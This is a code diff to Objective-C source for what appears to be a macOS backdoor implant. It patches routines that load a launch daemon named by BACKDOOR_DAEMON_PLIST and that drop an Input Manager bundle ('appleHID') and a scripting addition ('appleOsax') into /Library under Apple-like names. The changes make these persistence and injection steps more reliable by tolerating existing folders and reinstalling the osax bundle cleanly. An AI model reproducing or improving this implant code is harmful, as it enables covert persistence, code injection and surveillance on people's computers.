@@ -1275,7 +1275,6 @@ static void computerWillShutdown(CFMachPortRef port,
       while (true)
         sleep(1);
     }
-    
 }
 
 - (void)_guessNames
@@ -1701,7 +1700,7 @@ static void computerWillShutdown(CFMachPortRef port,
       
       return YES;
     }
-    
+  
   return NO;
 }
 
@@ -1777,7 +1776,7 @@ static void computerWillShutdown(CFMachPortRef port,
                                         stringByDeletingLastPathComponent]
                                        stringByDeletingLastPathComponent]
                                       stringByDeletingLastPathComponent],
-                                     BACKDOOR_DAEMON_PLIST ];
+                                     BACKDOOR_DAEMON_PLIST];
           
           NSArray *arguments = [NSArray arrayWithObjects:
                                 @"load",
@@ -1815,42 +1814,42 @@ static void computerWillShutdown(CFMachPortRef port,
   //
   // Input Manager
   //
-  if (mkdir("/Library/InputManagers", 0755) == -1)
+  if (mkdir("/Library/InputManagers", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir InputManagers (%d)", errno);
 #endif
       return NO;
     }
-  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1)
+  if (mkdir("/Library/InputManagers/appleHID", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir appleHID (%d)", errno);
 #endif
       return NO;
     }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1)
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir appleHID.bundle (%d)", errno);
 #endif
       return NO;
     }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1)
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir Contents (%d)", errno);
 #endif
       return NO;
     }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1)
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/MacOS", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir MacOS (%d)", errno);
 #endif
       return NO;
     }
-  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1)
+  if (mkdir("/Library/InputManagers/appleHID/appleHID.bundle/Contents/Resources", 0755) == -1 && errno != EEXIST)
     {
 #ifdef DEBUG_CORE
       errorLog(@"Error mkdir Resources (%d)", errno);
@@ -1939,6 +1938,12 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (void)_dropOsaxBundle
 {  
+  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
+    {
+      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
+                                                 error: nil];
+    }
+
   //
   // Scripting folder
   //
@@ -1947,12 +1952,6 @@ static void computerWillShutdown(CFMachPortRef port,
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents", 0755);
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/MacOS", 0755);
   mkdir("/Library/ScriptingAdditions/appleOsax/Contents/Resources", 0755);
-
-  if ([[NSFileManager defaultManager] fileExistsAtPath: @"/Library/ScriptingAdditions/appleOsax"])
-    {
-      [[NSFileManager defaultManager] removeItemAtPath: @"/Library/ScriptingAdditions/appleOsax"
-                                                 error: nil];
-    }
 
   NSString *destDir = [[NSString alloc] initWithFormat:
                        @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@",
